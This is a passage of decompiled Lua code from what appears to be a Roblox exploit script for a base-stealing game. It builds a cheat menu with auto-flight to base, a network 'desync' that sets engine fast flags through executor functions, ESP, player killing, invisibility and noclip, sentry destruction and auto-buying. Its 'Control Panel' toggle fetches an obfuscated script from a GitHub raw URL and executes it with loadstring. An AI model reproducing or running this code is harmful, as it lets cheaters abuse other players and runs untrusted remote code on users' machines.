            local v553_ = v552_ and v552_:FindFirstChild("HumanoidRootPart")
            if v553_ then
                local v_u_554_ = v553_:FindFirstChild("DeliveryTween_Attachment")
                local v_u_555_ = v553_:FindFirstChild("DeliveryLinearVelocity")
                if v_u_555_ then
                    pcall(function()
						-- upvalues: (ref) v_u_555_
                        v_u_555_.VectorVelocity = Vector3.new(0, 0, 0)
                    end)
                    pcall(function()
						-- upvalues: (ref) v_u_555_
                        v_u_555_:Destroy()
                    end)
                end
                if v_u_554_ then
                    pcall(function()
						-- upvalues: (ref) v_u_554_
                        v_u_554_:Destroy()
                    end)
                end
            end
        end
        if p547_ then
            local v_u_557_ = v_u_548_.Character or v_u_548_.CharacterAdded:Wait()
            local v558_ = v_u_557_
            local v_u_559_ = v_u_557_.WaitForChild(v558_, "HumanoidRootPart")
            v_u_548_.CharacterAdded:Connect(function(p560_)
				-- upvalues: (ref) v_u_557_, (ref) v_u_559_
                v_u_557_ = p560_
                v_u_559_ = p560_:WaitForChild("HumanoidRootPart")
            end)
            local v_u_561_ = 20
            local v_u_562_ = - 473
            local v_u_563_ = - 348
            local function v_u_564_()
				-- upvalues: (ref) v_u_557_, (ref) v_u_548_, (ref) v_u_559_
                if not (v_u_557_ and v_u_557_.Parent) then
                    v_u_557_ = v_u_548_.Character or v_u_548_.CharacterAdded:Wait()
                end
                if not v_u_557_ then
                    return nil
                end
                v_u_559_ = v_u_557_:FindFirstChild("HumanoidRootPart")
                return v_u_559_
            end
            local function v_u_568_(p565_)
                local v566_ = p565_:FindFirstChild("DeliveryTween_Attachment")
                if not v566_ then
                    v566_ = Instance.new("Attachment")
                    v566_.Name = "DeliveryTween_Attachment"
                    v566_.Parent = p565_
                end
                local v567_ = p565_:FindFirstChild("DeliveryLinearVelocity")
                if not v567_ then
                    v567_ = Instance.new("LinearVelocity")
                    v567_.Name = "DeliveryLinearVelocity"
                    v567_.Attachment0 = v566_
                    v567_.RelativeTo = Enum.ActuatorRelativeTo.World
                    v567_.MaxForce = math.huge
                    v567_.Parent = p565_
                end
                return v566_, v567_
            end
            local function v_u_571_(p_u_569_, p_u_570_)
                pcall(function()
					-- upvalues: (ref) p_u_570_
                    if p_u_570_ then
                        p_u_570_.VectorVelocity = Vector3.new(0, 0, 0)
                    end
                end)
                pcall(function()
					-- upvalues: (ref) p_u_570_
                    if p_u_570_ and p_u_570_.Parent then
                        p_u_570_:Destroy()
                    end
                end)
                pcall(function()
					-- upvalues: (ref) p_u_569_
                    if p_u_569_ and p_u_569_.Parent then
                        p_u_569_:Destroy()
                    end
                end)
            end
            local function v_u_584_()
				-- upvalues: (ref) v_u_548_
                local v572_ = nil
                local v573_ = workspace:FindFirstChild("Plots")
                local v574_
                if v573_ then
                    local v575_, v576_, v577_ = ipairs(v573_:GetChildren())
                    while true do
                        v577_, v574_ = v575_(v576_, v577_)
                        if v577_ == nil then
                            v574_ = v572_
                            break
                        end
                        local v578_, v579_, v580_ = ipairs(v574_:GetDescendants())
                        local v581_ = false
                        while true do
                            local v582_
                            v580_, v582_ = v578_(v579_, v580_)
                            if v580_ == nil then
                                break
                            end
                            if v582_:IsA("TextLabel") and type(v582_.Text) == "string" and v582_.Text:find(v_u_548_.DisplayName) then
                                v581_ = true
                                break
                            end
                        end
                        if v581_ then
                            break
                        end
                    end
                else
                    v574_ = v572_
                end
                if v574_ then
                    local v583_ = v574_:FindFirstChild("DeliveryHitbox")
                    if v583_ then
                        return v583_.Position
                    else
                        return nil
                    end
                else
                    return nil
                end
            end
            local function v_u_598_(p_u_585_, p_u_586_, p_u_587_)
				-- upvalues: (ref) v_u_550_, (ref) v_u_568_, (ref) v_u_551_, (ref) v_u_561_, (ref) v_u_571_
                if not (p_u_585_ and p_u_586_) then
                    return false
                end
                if not v_u_550_ then
                    return false
                end
                local v588_, v_u_589_ = v_u_568_(p_u_585_)
                local v_u_590_ = false
                local v_u_591_ = 0
                local v_u_592_ = nil
                local v596_ = v_u_551_.Heartbeat:Connect(function(_)
					-- upvalues: (ref) v_u_550_, (ref) v_u_590_, (ref) p_u_585_, (ref) v_u_592_, (ref) p_u_587_, (ref) p_u_586_, (ref) v_u_561_, (ref) v_u_591_, (ref) v_u_589_
                    if v_u_550_ then
                        if p_u_585_ and p_u_585_.Parent then
                            local v593_ = p_u_585_.Position
                            if math.abs(v593_.Y - - 6) > 3 then
                                if p_u_587_ ~= "MOVING_TO_X" then
                                    v_u_592_ = - 2
                                else
                                    v_u_592_ = 0
                                end
                            else
                                v_u_592_ = 0
                            end
                            local v594_ = p_u_586_ - v593_
                            if Vector3.new(v594_.X, 0, v594_.Z).Magnitude > 1 then
                                local v595_ = Vector3.new(v594_.X, 0, v594_.Z).Unit * v_u_561_
                                v_u_591_ = v_u_591_ + (v_u_592_ - v_u_591_) * 0.15
                                if v_u_589_ then
                                    v_u_589_.VectorVelocity = Vector3.new(v595_.X, v_u_591_, v595_.Z)
                                end
                            else
                                v_u_590_ = true
                            end
                        else
                            v_u_590_ = true
                            return
                        end
                    else
                        v_u_590_ = true
                        return
                    end
                end)
                local v597_ = v_u_589_
                while not v_u_590_ and v_u_550_ do
                    task.wait(0.03)
                end
                if v596_ and v596_.Connected then
                    v596_:Disconnect()
                end
                v_u_571_(v588_, v597_)
                return v_u_590_
            end
            local v599_ = v_u_548_
            local v600_ = v_u_548_.WaitForChild(v599_, "PlayerGui")
            local v601_ = Instance.new("ScreenGui", v600_)
            v601_.Name = "AutoDeliveryToggleGUI"
            v601_.ResetOnSpawn = false
            local v602_ = Instance.new("Frame", v601_)
            v602_.Size = UDim2.new(0, 220, 0, 40)
            v602_.Position = UDim2.new(1, - 230, 0, 170)
            v602_.AnchorPoint = Vector2.new(0, 0)
            v602_.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
            v602_.BorderSizePixel = 0
            v602_.Active = true
            v602_.Draggable = true
            Instance.new("UICorner", v602_).CornerRadius = UDim.new(0, 20)
            local v603_ = Instance.new("UIStroke", v602_)
            v603_.Color = Color3.fromRGB(0, 255, 255)
            v603_.Thickness = 2
            local v604_ = Instance.new("TextLabel", v602_)
            v604_.Size = UDim2.new(0, 150, 1, 0)
            v604_.Position = UDim2.new(0, 10, 0, 0)
            v604_.BackgroundTransparency = 1
            v604_.Text = "Fly To Base"
            v604_.TextColor3 = Color3.fromRGB(255, 255, 255)
            v604_.TextScaled = false
            v604_.TextSize = 16.5
            v604_.Font = Enum.Font.Gotham
            local v_u_605_ = Instance.new("Frame", v602_)
            v_u_605_.Size = UDim2.new(0, 50, 0, 25)
            v_u_605_.Position = UDim2.new(1, - 60, 0.5, - 12)
            v_u_605_.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
            v_u_605_.BorderSizePixel = 0
            Instance.new("UICorner", v_u_605_).CornerRadius = UDim.new(0, 12)
            local v_u_606_ = Instance.new("Frame", v_u_605_)
            v_u_606_.Size = UDim2.new(0, 20, 0, 20)
            v_u_606_.Position = UDim2.new(0, 2, 0.5, - 10)
            v_u_606_.BackgroundColor3 = Color3.fromRGB(200, 200, 255)
            v_u_606_.BorderSizePixel = 0
            Instance.new("UICorner", v_u_606_).CornerRadius = UDim.new(1, 0)
            local v607_ = Instance.new("TextButton", v_u_605_)
            v607_.Size = UDim2.new(1, 0, 1, 0)
            v607_.Position = UDim2.new(0, 0, 0, 2)
            v607_.BackgroundTransparency = 1
            v607_.Text = ""
            v607_.AutoButtonColor = false
            local function v_u_608_()
				-- upvalues: (ref) v_u_550_, (ref) v_u_606_, (ref) v_u_605_
                if v_u_550_ then
                    v_u_606_:TweenPosition(UDim2.new(0.55, 0, 0.5, - 10), "Out", "Sine", 0.2, true)
                    v_u_605_.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                else
                    v_u_606_:TweenPosition(UDim2.new(0, 2, 0.5, - 10), "Out", "Sine", 0.2, true)
                    v_u_605_.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
                end
            end
            v_u_608_()
            v607_.MouseButton1Click:Connect(function()
				-- upvalues: (ref) v_u_556_, (ref) v_u_550_, (ref) v_u_608_, (ref) v_u_549_, (ref) v_u_564_, (ref) v_u_584_, (ref) v_u_562_, (ref) v_u_563_, (ref) v_u_598_
                v_u_556_()
                v_u_550_ = not v_u_550_
                v_u_608_()
                if v_u_550_ then
                    v_u_549_ = task.spawn(function()
						-- upvalues: (ref) v_u_550_, (ref) v_u_564_, (ref) v_u_584_, (ref) v_u_562_, (ref) v_u_563_, (ref) v_u_598_, (ref) v_u_608_, (ref) v_u_556_
                        while v_u_550_ do
                            local v609_ = v_u_564_()
                            if v609_ then
                                local v610_ = v_u_584_()
                                if v610_ then
                                    local v611_ = v609_.Position.X
                                    local v612_
                                    if v611_ < v_u_562_ or v_u_563_ < v611_ then
                                        local v613_ = math.abs(v611_ - v_u_562_) < math.abs(v611_ - v_u_563_) and v_u_562_ or v_u_563_
                                        v612_ = v_u_598_(v609_, Vector3.new(v613_, v609_.Position.Y, v609_.Position.Z), "MOVING_TO_X")
                                    else
                                        v612_ = true
                                    end
                                    if v612_ and v_u_550_ then
                                        v612_ = v_u_598_(v609_, Vector3.new(v610_.X, v609_.Position.Y, v610_.Z), "MOVING_TO_TARGET")
                                    end
                                    if v612_ and v_u_550_ then
                                        v_u_550_ = false
                                        v_u_608_()
                                        task.wait(0.25)
                                    end
                                else
                                    task.wait(1)
                                end
                                task.wait(0.03)
                            else
                                task.wait(0.5)
                            end
                        end
                        v_u_556_()
                    end)
                else
                    if v_u_549_ then
                        task.cancel(v_u_549_)
                        v_u_549_ = nil
                    end
                    v_u_556_()
                end
            end)
        else
            local v614_, v615_, v616_ = ipairs(v_u_548_.PlayerGui:GetChildren())
            while true do
                local v617_, v618_ = v614_(v615_, v616_)
                if v617_ == nil then
                    break
                end
                v616_ = v617_
                if v618_.Name == "AutoDeliveryToggleGUI" then
                    v618_:Destroy()
                end
            end
            if v_u_549_ then
                task.cancel(v_u_549_)
            end
            v_u_556_()
        end
    end, 0.5)
    v337_("Kick after stealing", v487_, function(p619_)
        _G.KickOnSteal = p619_
    end)
    local v_u_620_ = false
    local v_u_621_ = nil
    local _, v631_, _ = v347_("Mobile Desync", v487_, function()
		-- upvalues: (ref) v_u_620_, (ref) v_u_621_, (ref) v_u_205_
        if not v_u_620_ then
            v_u_620_ = true
            v_u_621_.Text = "Mobile Desync: Active"
            function respawn(p622_)
				-- upvalues: (ref) v_u_205_
                local v623_
                if gethidden then
                    v623_ = gethidden(workspace, "RejectCharacterDeletions") ~= Enum.RejectCharacterDeletions.Disabled
                else
                    v623_ = false
                end
                if v623_ and replicatesignal then
                    replicatesignal(p622_.ConnectDiedSignalBackend)
                    task.wait(v_u_205_.RespawnTime - 0.1)
                    replicatesignal(p622_.Kill)
                else
                    local v624_ = p622_.Character
                    local v625_ = v624_:FindFirstChildWhichIsA("Humanoid")
                    if v625_ then
                        v625_:ChangeState(Enum.HumanoidStateType.Dead)
                    end
                    v624_:ClearAllChildren()
                    local v626_ = Instance.new("Model")
                    v626_.Parent = workspace
                    p622_.Character = v626_
                    task.wait()
                    p622_.Character = v624_
                    v626_:Destroy()
                end
            end
            local v627_, v628_, v_u_629_ = pairs({
                ["DisableDPIScale"] = true,
                ["S2PhysicsSenderRate"] = 15000,
                ["AngularVelociryLimit"] = 360,
                ["StreamJobNOUVolumeCap"] = 2147483647,
                ["GameNetDontSendRedundantDeltaPositionMillionth"] = 1,
                ["TimestepArbiterOmegaThou"] = 1073741823,
                ["MaxMissedWorldStepsRemembered"] = - 2147483648,
                ["GameNetPVHeaderRotationalVelocityZeroCutoffExponent"] = - 5000,
                ["PhysicsSenderMaxBandwidthBps"] = 20000,
                ["LargeReplicatorSerializeWrite4"] = true,
                ["MaxAcceptableUpdateDelay"] = 1,
                ["ServerMaxBandwith"] = 52,
                ["InterpolationFrameRotVelocityThresholdMillionth"] = 5,
                ["GameNetDontSendRedundantNumTimes"] = 1,
                ["StreamJobNOUVolumeLengthCap"] = 2147483647,
                ["CheckPVLinearVelocityIntegrateVsDeltaPositionThresholdPercent"] = 1,
                ["TimestepArbiterHumanoidTurningVelThreshold"] = 1,
                ["MaxTimestepMultiplierAcceleration"] = 2147483647,
                ["SimOwnedNOUCountThresholdMillionth"] = 2147483647,
                ["SimExplicitlyCappedTimestepMultiplier"] = 2147483646,
                ["TimestepArbiterVelocityCriteriaThresholdTwoDt"] = 2147483646,
                ["CheckPVCachedVelThresholdPercent"] = 10,
                ["ReplicationFocusNouExtentsSizeCutoffForPauseStuds"] = 2147483647,
                ["InterpolationFramePositionThresholdMillionth"] = 5,
                ["DebugSendDistInSteps"] = - 2147483648,
                ["LargeReplicatorEnabled9"] = true,
                ["CheckPVDifferencesForInterpolationMinRotVelThresholdRadsPerSecHundredth"] = 1,
                ["LargeReplicatorWrite5"] = true,
                ["NextGenReplicatorEnabledWrite4"] = true,
                ["MaxTimestepMultiplierContstraint"] = 2147483647,
                ["MaxTimestepMultiplierBuoyancy"] = 2147483647,
                ["MaxDataPacketPerSend"] = 2147483647,
                ["LargeReplicatorRead5"] = true,
                ["CheckPVDifferencesForInterpolationMinVelThresholdStudsPerSecHundredth"] = 1,
                ["TimestepArbiterHumanoidLinearVelThreshold"] = 1,
                ["WorldStepMax"] = 30,
                ["InterpolationFrameVelocityThresholdMillionth"] = 5,
                ["LargeReplicatorSerializeRead3"] = true,
                ["GameNetPVHeaderLinearVelocityZeroCutoffExponent"] = - 5000,
                ["CheckPVCachedRotVelThresholdPercent"] = 10
            })
            while true do
                local v_u_630_
                v_u_629_, v_u_630_ = v627_(v628_, v_u_629_)
                if v_u_629_ == nil then
                    break
                end
                pcall(function()
					-- upvalues: (ref) v_u_629_, (ref) v_u_630_
                    setfflag(tostring(v_u_629_), tostring(v_u_630_))
                end)
            end
            respawn(game:GetService("Players").LocalPlayer)
        end
    end)
    v_u_621_ = v631_
    if v_u_6_ or v_u_7_ then
        local v632_ = {}
        if v_u_6_ then
            table.insert(v632_, "10M - 30M")
        end
        if v_u_7_ then
            table.insert(v632_, "30M - 100B")
        end
        v486_("Joiner Range", v492_, v632_, function(p633_)
            if p633_ == "10M - 30M" then
                _G.Joiner.Min = 10000000
                _G.Joiner.Max = 29999999
            elseif p633_ == "30M - 100B" then
                _G.Joiner.Min = 30000000
                _G.Joiner.Max = 100000000000
            end
        end)
        v337_("Active Joiner", v492_, function(p634_)
            _G.Joiner.State = p634_
        end)
        v337_("Auto execute after join", v492_, function(p635_)
            _G.Joiner.Exec = p635_
        end)
    end
    v337_("ESP Base", v490_, function(p636_)
        _G.BaseESP = p636_
    end)
    v337_("ESP Players", v490_, function(p637_)
        _G.PlayerESP = p637_
    end)
    v337_("ESP Best Brainrot", v490_, function(p638_)
        _G.bestESP = p638_
    end)
    v404_("Esp Player Color", v490_, _G.PlayerESPColor, function(p639_)
        _G.PlayerESPColor = p639_
    end)
    local v_u_640_ = game:GetService("Players").LocalPlayer
    controlToggle = v337_("Control Panel", v489_, function(p641_)
		-- upvalues: (ref) v_u_250_, (ref) v_u_640_
        _G.activeGuis = _G.activeGuis or {}
        _G.activeGuis.control = p641_
        if p641_ then
            task.spawn(function()
				-- upvalues: (ref) v_u_250_, (ref) v_u_640_
                local v642_, v643_ = pcall(function()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Obama9282921781/Rjdhdidjdj/refs/heads/main/Protected_4809522785054226.lua.txt"))()
                end)
                if v642_ then
                    local v644_ = v_u_640_.PlayerGui:FindFirstChild("AjjanGui")
                    if v644_ then
                        v644_.Name = "LKZ-HUB"
                    end
                    v_u_640_.PlayerGui.ChildAdded:Connect(function(p645_)
                        if p645_.Name ~= "LKZ-HUB" then
                            if p645_.Name == "AjjanNotification" and p645_:IsA("ScreenGui") then
                                p645_:Destroy()
                            end
                        else
                            local v646_ = p645_.Frame
                            v646_.UICorner.CornerRadius = UDim.new(0, 5)
                            v646_.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                            local v647_, v648_, v649_ = ipairs(v646_:GetChildren())
                            while true do
                                local v650_
                                v649_, v650_ = v647_(v648_, v649_)
                                if v649_ == nil then
                                    break
                                end
                                if v650_:IsA("TextButton") then
                                    v650_.Font = Enum.Font.GothamBold
                                    v650_.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                                elseif v650_:IsA("TextLabel") then
                                    v650_.Text = "By Lucasggk1"
                                end
                            end
                            v646_.ChildAdded:Connect(function(p651_)
                                if p651_:IsA("TextButton") then
                                    p651_.Font = Enum.Font.GothamBold
                                    p651_.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                                elseif p651_:IsA("TextLabel") then
                                    p651_.Text = "By Lucasggk1"
                                end
                            end)
                        end
                    end)
                    local v652_ = v_u_640_.PlayerGui:FindFirstChild("LKZ-HUB")
                    if v652_ then
                        local v653_ = v652_.Frame
                        v653_.UICorner.CornerRadius = UDim.new(0, 5)
                        v653_.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
                        local v654_, v655_, v656_ = ipairs(v653_:GetChildren())
                        while true do
                            local v657_
                            v656_, v657_ = v654_(v655_, v656_)
                            if v656_ == nil then
                                break
                            end
                            if v657_:IsA("TextButton") then
                                v657_.Font = Enum.Font.GothamBold
                                v657_.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                            elseif v657_:IsA("TextLabel") then
                                v657_.Text = "By Lucasggk1"
                            end
                        end
                        v653_.ChildAdded:Connect(function(p658_)
                            if p658_:IsA("TextButton") then
                                p658_.Font = Enum.Font.GothamBold
                                p658_.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
                            elseif p658_:IsA("TextLabel") then
                                p658_.Text = "By Lucasggk1"
                            end
                        end)
                    end
                    local v659_ = v_u_640_.PlayerGui:FindFirstChild("AjjanNotification")
                    if v659_ then
                        v659_:Destroy()
                    end
                else
                    v_u_250_("Control Panel", "Failed to load GUI: " .. tostring(v643_), 3)
                end
            end)
        else
            local v660_ = v_u_640_.PlayerGui:FindFirstChild("LKZ-HUB")
            if v660_ then
                v660_:Destroy()
            end
        end
    end, 3)
    v337_("Kill Player", v489_, function(p661_)
        _G.KillGui = p661_
    end)
    v337_("Auto Laser Cape", v489_, function(p662_)
        _G.LaserCape = p662_
    end)
    v458_("LaserRange", "Laser Cape Range", v489_, 20, 80, _G.LaserRange, function(p663_)
        _G.LaserRange = math.floor(p663_)
    end)
    local v_u_664_ = v206_.Character or v206_.CharacterAdded:Wait()
    local v_u_665_ = Instance.new("Animation")
    v_u_665_.AnimationId = "rbxassetid://127212897044971"
    local v_u_666_ = nil
    local v_u_667_ = nil
    local function v_u_679_(p668_)
		-- upvalues: (ref) v_u_664_, (ref) v_u_666_, (ref) v_u_665_, (ref) v_u_667_, (ref) v_u_204_
        if v_u_664_ and v_u_664_:FindFirstChild("Humanoid") then
            if p668_ then
                if not (v_u_666_ and v_u_666_.IsPlaying) then
                    v_u_666_ = v_u_664_.Humanoid.Animator:LoadAnimation(v_u_665_)
                    v_u_666_.Priority = Enum.AnimationPriority.Action
                    v_u_666_:Play(0)
                    while v_u_666_.TimePosition < 0.1 do
                        task.wait()
                    end
                end
                if v_u_667_ then
                    v_u_667_:Disconnect()
                end
                v_u_667_ = v_u_204_.Stepped:Connect(function()
					-- upvalues: (ref) v_u_664_
                    local v669_ = v_u_664_
                    local v670_, v671_, v672_ = pairs(v669_:GetDescendants())
                    while true do
                        local v673_
                        v672_, v673_ = v670_(v671_, v672_)
                        if v672_ == nil then
                            break
                        end
                        if v673_:IsA("BasePart") and (v673_.Name ~= "HumanoidRootPart" and v673_.CanCollide) then
                            v673_.CanCollide = false
                            v673_:AddTag("WasCollidable")
                        end
                    end
                end)
            else
                if v_u_667_ then
                    v_u_667_:Disconnect()
                    v_u_667_ = nil
                end
                if v_u_666_ then
                    v_u_666_:Stop()
                end
                local v674_ = v_u_664_
                local v675_, v676_, v677_ = ipairs(v674_:GetDescendants())
                while true do
                    local v678_
                    v677_, v678_ = v675_(v676_, v677_)
                    if v677_ == nil then
                        break
                    end
                    if v678_:IsA("BasePart") and (v678_.Name ~= "HumanoidRootPart" and v678_:HasTag("WasCollidable")) then
                        v678_.CanCollide = true
                        v678_:RemoveTag("WasCollidable")
                    end
                end
            end
        end
    end
    v206_.CharacterAdded:Connect(function(p680_)
		-- upvalues: (ref) v_u_664_, (ref) v_u_679_, (ref) v_u_227_
        v_u_664_ = p680_
        v_u_664_:WaitForChild("Humanoid")
        _G.SemiInv = false
        v_u_679_(false)
        v_u_227_:SetValue("Misc", "Semi Invisible", false)
    end)
    v337_("Semi Invisible", v489_, function(p681_)
		-- upvalues: (ref) v_u_679_
        _G.SemiInv = p681_
        v_u_679_(p681_)
    end)
    v337_("Auto Destroy Sentry", v489_, function(p682_)
        _G.DestroySentry = p682_
    end)
    v337_("Fps Devourer", v489_, function(p683_)
        _G.FpsDev = p683_
    end)
    local v_u_684_ = false
    local v_u_685_ = nil
    local v_u_686_ = nil
    local v_u_690_ = (function()
        local v687_ = game:GetService("Players").LocalPlayer
        local v688_ = v687_.Character or v687_.CharacterAdded:Wait()
        local v689_ = v687_:WaitForChild("Backpack")
        return v688_:FindFirstChild("Flying Carpet") or v689_:FindFirstChild("Flying Carpet") or (v688_:FindFirstChild("Witch\'s Broom") or v689_:FindFirstChild("Witch\'s Broom"))
    end)() and "Tp To best" or "Go to Best"
    local _, v692_, v693_ = v347_(v_u_690_, v489_, function()
		-- upvalues: (ref) v_u_684_, (ref) v_u_685_, (ref) v_u_690_, (ref) v_u_686_, (ref) v_u_229_
        if not v_u_684_ then
            buy("Grapple Hook")
            buy("Quantum Cloner")
            v_u_684_ = true
            task.spawn(function()
                pcall(gotoBest)
            end)
            for v691_ = 15, 1, - 1 do
                v_u_685_.Text = v_u_690_ .. ": " .. v691_ .. "s"
                task.wait(1)
            end
            v_u_685_.Text = v_u_690_
            v_u_686_.BackgroundColor3 = v_u_229_.SECONDARY
            v_u_684_ = false
        end
    end)
    local v_u_694_ = v693_
    local _ = v692_
    task.spawn(function()
		-- upvalues: (ref) v_u_684_, (ref) v_u_694_, (ref) v_u_229_
        local v695_ = nil
        while task.wait(0.01) do
            if v_u_684_ ~= v695_ and v_u_694_ then
                v_u_694_.BackgroundColor3 = v_u_684_ and Color3.fromRGB(255, 140, 0) or v_u_229_.SECONDARY
                v695_ = v_u_684_
            end
        end
    end)
    local _, v_u_696_, _ = v416_("Server JobId", v491_, "Enter JobId here", function(_)
    end)
    local _, _, _ = v347_("Click to enter JobId", v491_, function()
		-- upvalues: (ref) v_u_696_, (ref) v_u_250_, (ref) v_u_210_, (ref) v_u_205_
        local v_u_697_ = tostring(v_u_696_() or "")
        if v_u_697_ == "" then
            v_u_250_("Teleport", "JobId is empty", 3)
        else
            pcall(function()
				-- upvalues: (ref) v_u_210_, (ref) v_u_697_, (ref) v_u_205_
                v_u_210_:TeleportToPlaceInstance(game.PlaceId, v_u_697_, v_u_205_.LocalPlayer)
            end)
        end
    end)
    local v_u_698_ = false
    local v_u_699_ = nil
    local v_u_700_ = {}
    local function v_u_725_(p701_)
		-- upvalues: (ref) v_u_698_, (ref) v_u_699_, (ref) v_u_700_
        if p701_ ~= v_u_698_ then
            v_u_698_ = p701_
            if p701_ then
                local v702_ = game:GetService("Lighting")
                v_u_699_ = {
                    ["Ambient"] = v702_.Ambient,
                    ["OutdoorAmbient"] = v702_.OutdoorAmbient,
                    ["Brightness"] = v702_.Brightness,
                    ["GlobalShadows"] = v702_.GlobalShadows,
                    ["FogEnd"] = v702_.FogEnd,
                    ["ClockTime"] = v702_.ClockTime,
                    ["OutdoorAmbient"] = v702_.OutdoorAmbient
                }
                v702_.Ambient = Color3.fromRGB(100, 100, 100)
                v702_.OutdoorAmbient = Color3.fromRGB(100, 100, 100)
                v702_.Brightness = 1
                v702_.GlobalShadows = false
                v702_.FogEnd = 1000000
                v702_.ClockTime = 12
                v_u_700_ = {
                    ["parts"] = {},
                    ["decals"] = {},
                    ["effects"] = {}
                }
                local v703_, v704_, v705_ = ipairs(workspace:GetDescendants())
                while true do
                    local v706_, v_u_707_ = v703_(v704_, v705_)
                    if v706_ == nil then
                        break
                    end
                    v705_ = v706_
                    if v_u_707_:IsA("ParticleEmitter") or (v_u_707_:IsA("Trail") or (v_u_707_:IsA("Smoke") or (v_u_707_:IsA("Fire") or v_u_707_:IsA("Sparkles")))) then
                        v_u_700_.effects[v_u_707_] = v_u_707_.Enabled
                        pcall(function()
							-- upvalues: (ref) v_u_707_
                            v_u_707_.Enabled = false
                        end)
                    end
                    if v_u_707_:IsA("Decal") or v_u_707_:IsA("Texture") then
                        v_u_700_.decals[v_u_707_] = v_u_707_.Transparency
                        pcall(function()
							-- upvalues: (ref) v_u_707_
                            v_u_707_.Transparency = 1
                        end)
                    end
                    if v_u_707_:IsA("BasePart") then
                        v_u_700_.parts[v_u_707_] = {
                            ["Material"] = v_u_707_.Material,
                            ["CastShadow"] = v_u_707_.CastShadow,
                            ["Transparency"] = v_u_707_.Transparency
                        }
                        pcall(function()
							-- upvalues: (ref) v_u_707_
                            v_u_707_.Material = Enum.Material.Plastic
                            v_u_707_.CastShadow = false
                        end)
                    end
                end
                local v_u_708_ = workspace:FindFirstChildOfClass("Terrain")
                if v_u_708_ then
                    v_u_700_.terrainProps = {
                        ["WaterTransparency"] = v_u_708_.WaterTransparency
                    }
                    pcall(function()
						-- upvalues: (ref) v_u_708_
                        v_u_708_.WaterTransparency = 1
                    end)
                end
            else
                local v709_ = game:GetService("Lighting")
                if v_u_699_ then
                    v709_.Ambient = v_u_699_.Ambient
                    v709_.OutdoorAmbient = v_u_699_.OutdoorAmbient
                    v709_.Brightness = v_u_699_.Brightness
                    v709_.GlobalShadows = v_u_699_.GlobalShadows
                    v709_.FogEnd = v_u_699_.FogEnd
                    v709_.ClockTime = v_u_699_.ClockTime
                    v_u_699_ = nil
                end
                local v710_, v711_, v712_ = pairs(v_u_700_.effects or {})
                while true do
                    local v_u_713_, v_u_714_ = v710_(v711_, v712_)
                    if v_u_713_ == nil then
                        break
                    end
                    v712_ = v_u_713_
                    if v_u_713_ and v_u_713_.Parent then
                        pcall(function()
							-- upvalues: (ref) v_u_713_, (ref) v_u_714_
                            v_u_713_.Enabled = v_u_714_
                        end)
                    end
                end
                local v715_, v716_, v717_ = pairs(v_u_700_.decals or {})
                while true do
                    local v_u_718_, v_u_719_ = v715_(v716_, v717_)
                    if v_u_718_ == nil then
                        break
                    end
                    v717_ = v_u_718_
                    if v_u_718_ and v_u_718_.Parent then
                        pcall(function()
							-- upvalues: (ref) v_u_718_, (ref) v_u_719_
                            v_u_718_.Transparency = v_u_719_
                        end)
                    end
                end
                local v720_, v721_, v722_ = pairs(v_u_700_.parts or {})
                while true do
                    local v_u_723_, v_u_724_ = v720_(v721_, v722_)
                    if v_u_723_ == nil then
                        break
                    end
                    v722_ = v_u_723_
                    if v_u_723_ and v_u_723_.Parent then
                        pcall(function()
							-- upvalues: (ref) v_u_723_, (ref) v_u_724_
                            v_u_723_.Material = v_u_724_.Material
                            v_u_723_.CastShadow = v_u_724_.CastShadow
                            v_u_723_.Transparency = v_u_724_.Transparency
                        end)
                    end
                end
                if v_u_700_.terrainProps and workspace:FindFirstChildOfClass("Terrain") then
                    pcall(function()
						-- upvalues: (ref) v_u_700_
                        workspace:FindFirstChildOfClass("Terrain").WaterTransparency = v_u_700_.terrainProps.WaterTransparency
                    end)
                end
                v_u_700_ = {}
            end
        end
    end
    v337_("Low Graphic", v491_, function(p726_)
		-- upvalues: (ref) v_u_725_
        v_u_725_(p726_)
    end)
    v370_("Auto Collect Section", "", v493_)
    v337_("Auto Collect", v493_, function(p727_)
        _G.AutoCollect = p727_
    end)
    v458_("Delaycollect", "Delay Auto Collect", v493_, 5, 100, _G.DelayCollect, function(p728_)
        _G.DelayCollect = p728_
    end)
    v370_("Auto Buy Section", "", v493_)
    v337_("Auto Buy", v493_, function(p729_)
        _G.AutobuyEnable = p729_
    end)
    v486_("Minimum value for auto purchase", v493_, {
        "1K/s",
        "10K/s",
        "100K/s",
        "300K/s",
        "1M/s",
        "10M/s",
        "50M/s"
    }, function(p730_)
        if p730_ == "1K/s" then
            _G.AutobuyMin = 1000
        elseif p730_ == "10K/s" then
            _G.AutobuyMin = 10000
        elseif p730_ == "100K/s" then
            _G.AutobuyMin = 100000
        elseif p730_ == "300K/s" then
            _G.AutobuyMin = 300000
        elseif p730_ == "1M/s" then
            _G.AutobuyMin = 1000000
        elseif p730_ == "10M/s" then
            _G.AutobuyMin = 10000000
        elseif p730_ == "50M/s" then
            _G.AutobuyMin = 50000000
        end
    end)
    v370_("Movement Keybinds", "", v_u_257_)
    v382_("Fly", v_u_257_, "None")
    v382_("Anti Ragdoll", v_u_257_, "None")
    v382_("Super Jump", v_u_257_, "None")
    v382_("Speed Boost", v_u_257_, "None")
    v370_("Helper Keybinds", "", v_u_257_)
    v382_("Upstairs", v_u_257_, "None")
    v382_("Float V2", v_u_257_, "None")
    v382_("Float V1", v_u_257_, "None")
    v382_("Fly To Base", v_u_257_, "None")
    v382_("Kick after stealing", v_u_257_, "None")
    v382_("Mobile Desync", v_u_257_, "None")
    v370_("ESP Keybinds", "", v_u_257_)
    v382_("ESP Base", v_u_257_, "None")
    v382_("ESP Players", v_u_257_, "None")
    v382_("ESP Best Brainrot", v_u_257_, "None")
    v370_("Misc Keybinds", "", v_u_257_)
    v382_("Control Panel", v_u_257_, "None")
    v382_("Kill Player", v_u_257_, "None")
    v382_("Auto Laser Cape", v_u_257_, "None")
    v382_("Semi Invisible", v_u_257_, "None")
    v382_("Auto Destroy Sentry", v_u_257_, "None")
    v382_("Fps Devorer", v_u_257_, "None")
